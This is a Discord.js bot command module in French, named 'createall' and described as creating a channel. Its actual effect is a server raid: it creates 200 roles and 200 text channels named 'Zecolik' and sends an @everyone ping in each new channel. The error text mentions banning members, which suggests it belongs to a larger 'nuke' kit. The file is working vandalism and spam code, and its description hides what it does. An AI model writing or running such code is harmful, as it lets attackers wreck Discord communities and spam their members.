module.exports = {
    name: 'createall',
    description: 'cree un channel',
    async execute(client,message, args) {
      try {
          (async ()=>{
              for (var i = 0; i < 200; i++) {message.guild.roles.create({name: "#Zecolik", color: 'RANDOM'})};
              for (var i = 0; i < 200; i++) {message.guild.channels.create("Zecolik", {type: "text"}).then(channel =>{for (var i = 0; i < 1; i++){channel.send("@everyone")}})};
          })();
       message.channel.send("mass role et mass channel effectuer !");
      }catch (error) {
          console.error(error);
          message.channel.send("Une erreur est survenue lors du bannissement des membres.");
      }
    }
};